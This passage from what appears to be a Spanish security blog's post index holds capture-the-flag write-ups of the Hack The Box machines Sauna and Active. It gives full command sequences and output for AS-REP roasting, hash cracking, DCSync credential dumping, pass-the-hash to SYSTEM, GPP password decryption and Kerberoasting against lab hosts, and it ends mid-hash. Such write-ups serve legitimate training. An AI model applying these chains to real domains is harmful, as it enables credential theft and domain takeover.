/_____  _____/ /_  _______  __/ /____   / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        Version: dev (n/a) - 02/06/23 - Ronnie Flathers @ropnop2023/02/06 23:51:42 &gt;  Using KDC(s):2023/02/06 23:51:42 &gt;   10.10.10.175:882023/02/06 23:51:43 &gt;  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL2023/02/06 23:51:43 &gt;  [+] fsmith has no pre auth required. Dumping hash to crack offline:$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:95aec76a6cc2f05ace293d1202d2e7a7$fed329cbe11f4839114818972f65a86a0ef12e9ca34fd2097f3d2d563091c80e9eac88cbc19f038eab0ec3cc5b4217264ff23b78d2bc499481e2e8c64a9b8ed86df1d64f04584f334df86fcf9415d0c1792e8f787e75b45d6624b6d7a1a9feedc194dd68113ece2fac76a5b1126c5db93c76a7ef8c6b7f7cc37d5d4d90d82ff1930ff2a1a926321cd5e44f7ca3d6733f777f5bb3eca06c7702d9a504abcffe24a489bc195a74baeb4398a7f4059778321779c919a2ee610592783b8bc9e919f688ac6bafd3991a3eea4eeac15ad7f716546425f12050b523b46a7413d58c01f6dd11e3f8106d968f8f0167ca89d38ecbdbcfa0c3b98cd51217999f20265e51e837fa1a55cdbbdd7401dac8fefbbcebb3831c5b787d84                                                                                                                                                   2023/02/06 23:51:43 &gt;  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL2023/02/06 23:51:43 &gt;  Done! Tested 7 usernames (2 valid) in 0.150 secondsEncontramos otro usuario válido, en este caso fsmith, además kerbrute logró extraer el hash pues no requiere de una autenticación previa.ExplotaciónSin embargo, utilizaremos otra herramienta para realizar el ASRepRoast, llamada impacket-GetNPUsers:impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile names.txtImpacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 Fortra$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:56e8584ae2edd99e1fcea1e7ffad0b2e$9d2d44cdbe49350f25616e2ea10fb36a06ce491fe2233cac2a280b320a96565293bf3c06a380d7afe224c51d4feaad58aee4aa2905da4df46cb2aa7ce8c5ae0547c8a769c7f234d0979e24117755ff6a11baed82e03043141cb8f5bee8aed57bc28e152bb47a97336ea70e1ae62e1b13ac8739e4dac20e0f024d089c511310a5e73e97dba2d047ea6e8e44fb2e1bce9a40ebf44e6b34b684f08cbd77947a330450b2f51d88524b35c3d11d806ae2fafdff8c269fe9837f498998ad6550f15a78ea5887f79c5c197f43edb69ccd063afaa9536f0787369d2bcbdf59185b8bb44587f032356993ccfbc6ac6c1509d12e370a4740b6d50b22ca0ac3236a381457c8[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH setEste hash lo crackeamos con jhon, utilizando el diccionario rockyou.txt:john --wordlist=/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusThestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)     1g 0:00:00:08 DONE (2023-02-07 01:58) 0.1203g/s 1268Kp/s 1268Kc/s 1268KC/s Thing..Thehunter22Use the \"--show\" option to display all of the cracked passwords reliablySession completed. Tenemos una contraseña, Thestrokes23 comprobaremos el usuario mediante crackmapexec:crackmapexec smb 10.10.10.175 -u'fsmith' -p'Thestrokes23'SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\\fsmith:Thestrokes23 Como está validado intentaremos comprobar si este usuario pertenece al grupo remote management use, pues se tiene que el puerto 5985 está abierto, esto lo realizamos utilizando crackmapexec:crackmapexec winrm 10.10.10.175 -u'fsmith' -p'Thestrokes23'SMB         10.10.10.175    5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsmanWINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\\fsmith:Thestrokes23 (Pwn3d!)Observamos que si lo es, por lo tanto hacemos uso de evil-winrm para conectarnos a la máquina:evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'Evil-WinRM shell v3.4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\FSmith\\Documents&gt; whoamiegotisticalbank\\fsmithHemos vulnerado la máquina y estamos dentro, por lo tanto buscamos la flag del usuario, la cual se encuentra en su directorio personal:*Evil-WinRM* PS C:\\Users\\FSmith\\Desktop&gt; dir    Directory: C:\\Users\\FSmith\\DesktopMode                LastWriteTime         Length Name----                -------------         ------ -----ar---         2/7/2023   1:58 AM             34 user.txt*Evil-WinRM* PS C:\\Users\\FSmith\\Desktop&gt; type user.txte783e270192f415ead94f8Escalada de privilegiosEn primer lugar, buscamos los usuarios en el sistema:*Evil-WinRM* PS C:\\Users\\FSmith&gt; net userUser accounts for \\\\-------------------------------------------------------------------------------Administrator            FSmith                   GuestHSmith                   krbtgt                   svc_loanmgrObservamos que existen otros, el interesante podría ser svc_loanmgr.Buscamos si tenemos algún privilegio interesante en particular:*Evil-WinRM* PS C:\\Users\\FSmith&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name                Description                    State============================= ============================== =======SeMachineAccountPrivilege     Add workstations to domain     EnabledSeChangeNotifyPrivilege       Bypass traverse checking       EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledPero no hay nada. Buscamos archivos ocultos, pero tampoco hay nada.Por lo tanto, utilizaremos la herramienta WinPEAS para buscar alguna información o vía para escalar privilegios, para ello pasamos el archivo winPEASx64.exe a la máquina víctima:*Evil-WinRM* PS C:\\Users\\FSmith&gt; upload /home/kali/Downloads/winPEASx64.exeInfo: Uploading /home/kali/Downloads/winPEASx64.exe to C:\\Users\\FSmith\\winPEASx64.exe                                                             Data: 2625536 bytes of 2625536 bytes copiedInfo: Upload successful!Mientras ejecutamos la herramienta vemos algo interesate:ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials    Some AutoLogon credentials were found    DefaultDomainName             :  EGOTISTICALBANK    DefaultUserName               :  EGOTISTICALBANK\\svc_loanmanager    DefaultPassword               :  Moneymakestheworldgoround!Se tienen las credenciales por defecto de AutoLogon, con crackmapexec probamos si son correctas:crackmapexec smb 10.10.10.175 -u'svc_loanmgr' -p 'Moneymakestheworldgoround!'SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:Moneymakestheworldgoround!Comprobamos mediante winrm si pertenece al grupo remote management use:crackmapexec winrm 10.10.10.175 -u'svc_loanmgr' -p 'Moneymakestheworldgoround!'SMB         10.10.10.175    5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsmanWINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)Como si pertenece entramos con evil-winrm:evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'Evil-WinRM shell v3.4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents&gt; whoamiegotisticalbank\\svc_loanmgrEntramos correctamente con el usuario svc_loanmgr, sin embargo, realizando todo lo anterior, de primeras no encontramos nada potencial para escalar privilegios, por lo tanto, utilizaremos BloodHound para analizar vías potenciales.Para utilizar BloodHound necesitas un archivo comprimido que recopile información del sistema, para ellos haremos uso de Sharphound.exe (Sharphound.ps1 ya no funciona), este ejecutable se puede encontrar en github, dicho archivo lo subimos a la máquina víctima:*Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents&gt; upload /home/kali/Downloads/SharpHound.exeInfo: Uploading /home/kali/Downloads/SharpHound.exe to C:\\Users\\svc_loanmgr\\Documents\\SharpHound.exe                                                             Data: 1402196 bytes of 1402196 bytes copiedInfo: Upload successful!Luego de ejecutarlo (./SharpHound.exe), nos arrojará un comprimido con la información obtenida:*Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents&gt; dir    Directory: C:\\Users\\svc_loanmgr\\DocumentsMode                LastWriteTime         Length Name----                -------------         ------ -----a----         2/8/2023  12:58 AM          11453 20230208005806_BloodHound.zip-a----         2/8/2023  12:48 AM        1051648 SharpHound.exe-a----         2/8/2023  12:58 AM           8601 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.binEste archivo lo pasamos a nuestro equipo para subirlo a BloodHound:C:\\Users\\svc_loanmgr\\Documents&gt; download ./20230208005806_BloodHound.zipInfo: Downloading ./20230208005806_BloodHound.zip to ./20230208005806_BloodHound.zip                                                             Info: Download successful!Dentro de BloodHound subimos el archivo y esperamos que se carguen correctamente:Luego, entramos de las opciones de análisis de BloodHound:Dentro de estas opciones de análisis iremos probando, en este caso, por Dangerous privileges, lo que nos arrojará el siguiente grafo:El último usuario corresponde al usuariuo svc_loanmgr, del cual ya tenemos su contraseña.Se ve el ataque DCSync, para inspeccionar en que consiste hacemos click derecho y help:Al ya disponer de las credenciales del usuario svc_loanmgr podemos realizar este ataque, para ello utilizaremos impacket-secretdump (también se podría utilizar mimikatz):impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175Impacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 FortraPassword:[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::EGOTISTICAL-BANK.LOCAL\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::EGOTISTICAL-BANK.LOCAL\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:169b9130c295b7a53c3530976d6d5a88:::[*] Kerberos keys grabbedAdministrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4eAdministrator:des-cbc-md5:fb8f321c64cea87fkrbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9krbtgt:des-cbc-md5:c170d5dc3edfc1d9EGOTISTICAL-BANK.LOCAL\\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324EGOTISTICAL-BANK.LOCAL\\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9EGOTISTICAL-BANK.LOCAL\\HSmith:des-cbc-md5:1c73b99168d3f8c7EGOTISTICAL-BANK.LOCAL\\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2EGOTISTICAL-BANK.LOCAL\\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843bEGOTISTICAL-BANK.LOCAL\\FSmith:des-cbc-md5:b50e02ab0d85f76bEGOTISTICAL-BANK.LOCAL\\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacbaEGOTISTICAL-BANK.LOCAL\\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972cEGOTISTICAL-BANK.LOCAL\\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2SAUNA$:aes256-cts-hmac-sha1-96:4faee1a41406b9665c2104ad1265214bb0fff97b79a1749f27fc6770e8ddee22SAUNA$:aes128-cts-hmac-sha1-96:accc3942ac95cec26886e61b6affb5ceSAUNA$:des-cbc-md5:104c515b86739e08[*] Cleaning up... Observamos que tenemos los hashes LM de los usuarios, en este punto se puede intentar realizar un pass the hash con el usuario administrator con lo extraido del exploit, para ello utilizamos psexec.py:psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98eImpacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 Fortra[*] Requesting shares on 10.10.10.175.....[*] Found writable share ADMIN$[*] Uploading file RLWZBaJJ.exe[*] Opening SVCManager on 10.10.10.175.....[*] Creating service xoLS on 10.10.10.175.....[*] Starting service xoLS.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.973](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt; whoamint authority\\systemEn este punto solo debemos ingresar al directorio personal del administrador para encontrar la flag:C:\\Users\\Administrator\\Desktop&gt; dir Volume in drive C has no label. Volume Serial Number is 489C-D8FC Directory of C:\\Users\\Administrator\\Desktop07/14/2021  02:35 PM    &lt;DIR&gt;          .07/14/2021  02:35 PM    &lt;DIR&gt;          ..02/07/2023  08:01 PM                34 root.txt               1 File(s)             34 bytes               2 Dir(s)   7,813,935,104 bytes freeC:\\Users\\Administrator\\Desktop&gt; type root.txt711fa88c7069c8be2f7f!Listo!Hemos vulnerado completamente la máquina hasta ser administradores.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Active HTB Write-up",
    "url": "/posts/Active/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Active Directory, GPP, Kerberoast attack, Windows, Easy",
    "date": "2023-02-06 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Active, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Active, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema, en este caso es de directorio activo (smbmap,smbclient,crackmapexec).  Obtención de contraseñas a través del archivo grupos.xlm de Group Policy Preferences.  kerberoast attack (Para escalar privilegios).Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.10.100PING 10.10.10.100 (10.10.10.100) 56(84) bytes of data.64 bytes from 10.10.10.100: icmp_seq=1 ttl=127 time=583 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS -open -min-rate 5000 10.10.10.100Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT      STATE SERVICE53/tcp    open  domain88/tcp    open  kerberos-sec135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds464/tcp   open  kpasswd5593/tcp   open  http-rpc-epmap636/tcp   open  ldapssl3268/tcp  open  globalcatLDAP3269/tcp  open  globalcatLDAPssl5722/tcp  open  msdfsr9389/tcp  open  adws47001/tcp open  winrm49152/tcp open  unknown49153/tcp open  unknown49154/tcp open  unknown49155/tcp open  unknown49157/tcp open  unknown49158/tcp open  unknown49165/tcp open  unknown49170/tcp open  unknown49171/tcp open  unknownLos puertos expuestos de la máquina nos hacen pensar que se trata de un directorio activo, sin embargo, realizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49166,49168 10.10.10.100 -oN ServiceScanComo resultado del escaneo tenemos:PORT      STATE  SERVICE       VERSION53/tcp    open   domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid: |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-06 23:23:35Z)135/tcp   open   msrpc         Microsoft Windows RPC139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp   open   microsoft-ds?464/tcp   open   kpasswd5?593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp   open   tcpwrapped3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)3269/tcp  open   tcpwrapped5722/tcp  open   msrpc         Microsoft Windows RPC9389/tcp  open   mc-nmf        .NET Message Framing47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49152/tcp open   msrpc         Microsoft Windows RPC49153/tcp open   msrpc         Microsoft Windows RPC49154/tcp open   msrpc         Microsoft Windows RPC49155/tcp open   msrpc         Microsoft Windows RPC49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.049158/tcp open   msrpc         Microsoft Windows RPC49165/tcp open   msrpc         Microsoft Windows RPC49166/tcp closed unknown49168/tcp closed unknownService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:| smb2-time: |   date: 2023-02-06T23:24:35|_  start_date: 2023-02-06T22:55:57| smb2-security-mode: |   210: |_    Message signing enabled and requiredEfectivamente, estamos frente a un directorio activo. En primer lugar, se observa el puerto 445 abierto, el cual corresponde al servicio smb, por lo tanto, intentaremos realizar una enumeración del equipo y también si es posible de usuarios o recursos, para ello usaremos diferentes herramientas, la primera es crackmapexec:crackmapexec smb 10.10.10.100SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)Se puede observar que es un DC y que el dominio es active.htb, por lo tanto, abrimos el /etc/hosts e ingresamos dicho nombre de dominio:127.0.0.1       localhost127.0.1.1       kali::1             localhost ip6-localhost ip6-loopbackff02::1         ip6-allnodesff02::2         ip6-allrouters10.10.10.100    active.htbPara de esta manera tener conectividad, para comprobarlo utilizamos ping:ping -c 1 active.htbPING active.htb (10.10.10.100) 56(84) bytes of data.64 bytes from active.htb (10.10.10.100): icmp_seq=1 ttl=127 time=144 msLuego de comprobar lo anterior, probamos si se pueden listar archivos compartidos en la red, con la herramienta crackmapexec:crackmapexec smb 10.10.10.100 --sharesSMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)SMB         10.10.10.100    445    DC               [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)Sin embargo, no fue posible. Para seguir la enumeración utilizamos smbmap:smbmap -H 10.10.10.100[+] IP: 10.10.10.100:445        Name: active.htb                                                Disk                                                    Permissions     Comment        ----                                                    -----------     -------        ADMIN$                                                  NO ACCESS       Remote Admin        C$                                                      NO ACCESS       Default share        IPC$                                                    NO ACCESS       Remote IPC        NETLOGON                                                NO ACCESS       Logon server share         Replication                                             READ ONLY        SYSVOL                                                  NO ACCESS       Logon server share         Users                                                   NO ACCESSTenemos capacidad de lectura en el recurso Replication, utilizando smbclient intentamos conectarnos utilizando sesión anónima:smbclient //10.10.10.100/Replication -NAnonymous login successfulTry \"help\" to get a list of possible commands.smb: \\&gt; Logramos conectarnos, ahora buscaremos los archivos compartidos.Dentro del directorio active.htb encontramos los archivos:smb: \\active.htb\\&gt; dir  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  DfsrPrivate                       DHS        0  Sat Jul 21 06:37:44 2018  Policies                            D        0  Sat Jul 21 06:37:44 2018  scripts                             D        0  Wed Jul 18 14:48:57 2018                5217023 blocks of size 4096. 279628 blocks availablesmb: \\active.htb\\&gt; Estos archivos corresponden a los encontrados en el recurso SYSVOL, por lo tanto, puede ser que este archivo sea una replicación del mismo. Esto es peligroso debido a que existe un archivo llamado Groups.xml que puede contener contraseñas, por lo tanto, buscaremos dentro de los directorios por si lo encontramos.smb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\&gt; dir  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018Tenemos suerte, encontramos el archivo, por lo tanto, lo transferimos a nuestro equipo:smb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\&gt; get Groups.xmlgetting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml of size 533 as Groups.xml (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)Al abrir el archivo encontramos lo siguiente:cat Groups.xml&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/&gt;&lt;/User&gt;&lt;/Groups&gt;Si prestamos atención, podemos ver un usuario y contraseña:name=\"active.htb\\SVC_TGS\"cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\"Especificamente es un hash, por lo tanto, si se logra romper dicho hash podremos ver la contraseña en texto claro.ExplotaciónPara crackear el hash se utiliza la herramienta gpp-decrypt:gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQGPPstillStandingStrong2k18Teniendo un posible usuario y contraseña, los validamos utilizando crackmapexec:crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)SMB         10.10.10.100    445    DC               [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18 Con las credenciales utilizamos smbmap:smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'[+] IP: 10.10.10.100:445        Name: active.htb                                                Disk                                                    Permissions     Comment        ----                                                    -----------     -------        ADMIN$                                                  NO ACCESS       Remote Admin        C$                                                      NO ACCESS       Default share        IPC$                                                    NO ACCESS       Remote IPC        NETLOGON                                                READ ONLY       Logon server share         Replication                                             READ ONLY        SYSVOL                                                  READ ONLY       Logon server share         Users                                                   READ ONLYObservamos que tenemos capacidad de lectura en el directorio Users, navegamos hasta el directorio personal del usuario SVC_TGS:smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users/SVC_TGS/Desktop[+] IP: 10.10.10.100:445        Name: active.htb                                                Disk                                                    Permissions     Comment        ----                                                    -----------     -------        Users                                                   READ ONLY        .\\UsersSVC_TGS\\Desktop\\*        dr--r--r--                0 Sat Jul 21 11:14:42 2018    .        dr--r--r--                0 Sat Jul 21 11:14:42 2018    ..        fw--w--w--               34 Mon Feb  6 17:56:46 2023    user.txtEncontramos la flag de usuario, por lo tanto, la descargamos:smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --download Users/SVC_TGS/Desktop/user.txt[+] Starting download: Users\\SVC_TGS\\Desktop\\user.txt (34 bytes)[+] File output to: /home/kali/Downloads/10.10.10.100-Users_SVC_TGS_Desktop_user.txtLo abrimos (ocultamos la mitad de la flag):cat 10.10.10.100-Users_SVC_TGS_Desktop_user.txtf7a72e19020436212c3a6¡Bien! hemos vulnerado la máquina, ahora toca convertirse en domain admin.Escalada de privilegiosComo la máquina no tiene el puerto 5985 abierto no podemos realizar nada con respecto al grupo remote management use. Sin embargo, se puede intentar realizar un ataque kerberoast, para esto utilizaremos el GetUserSPNs.py, dependiendo de lo que responda podremos obtener el ticket:GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18Impacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 FortraServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation --------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-02-06 17:56:58.570146 Podemos observar que si, para obtener el ticket agregamos la flag request:GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -requestImpacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 FortraServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation --------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-02-06 19:45:27.307178             [-] CCache file is not found. Skipping...$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8a915b03b8c2e698a01ebd0b0c67c164$04fd9de1a7886832b4ed8f449f4fd2452a538fc2069bc86165e2917cb568c5d8ed88ba122d4629272d9db640fc719d726e3ea7fa041bcfba29ae3ceac3e605168e88a5f335fb9015564401ae64aa1352c6ba6057b19babd0ead9186194aaf2603dae85f8a22f6baecc5a4b849547b23ca8aca7899fe3ab7d6e05a6377a1bcda8463f5041b63a5df66f3b62f74eba18f3110a0796351d0dfaa9b765a7a8f93c4027a25f90423c258a40f662908f676f8bf4d312a35e9d91ec477ae212bbae96cf39b46717d796a8f5927999bbc7abec430df29f3e78328319c0e67d664a43df1cad6eb4b202fca448319975ebdf23d6ccd22488332a1ee5c61495f36477fe4caf0138faa078ea2bef5963a8f8856a202e4a2329a44363970b1d50944d3208fca98f3fe7f84fcfc82d14df458c3e10dc3123e313dd5536860cf79235ca969e3d515513e20402c9741188c18602f55ab44a8cfa9af174129f7481b86a686964301ffbbe25506cbfd915b7aa47c077ac327cb6f87a3981f15fa1822fc742b9151e33432aede1178898f96d56a07aaa92f255a0aaba7bb348f24f44184be4901909babe8ffc7c93d88c6aa87a4a9ef1def2ed5f10fa0e0b3e1d9d119d873af28a1e3ccf02b1ddede5be00e51ae977bcdaf06064c3e499e2404ada87522b204f167e083032997df2f1f0179ccd44571b6db9ff371e2ca88ebdce6ed41637776a5400aa6116277a2bc07f62b7396db0c2f8aa3b21fd376f1448286bc1902a4e3f47a6e4f8db97462bfbec89ba4b7520664ff9aa7c73f23e351772f20dabb7a8af9964cbf46b2d4c663f7043891a9fc7ad69c36da8b75a9f9727bdc342ac7605dbf25753dcf4883be00cc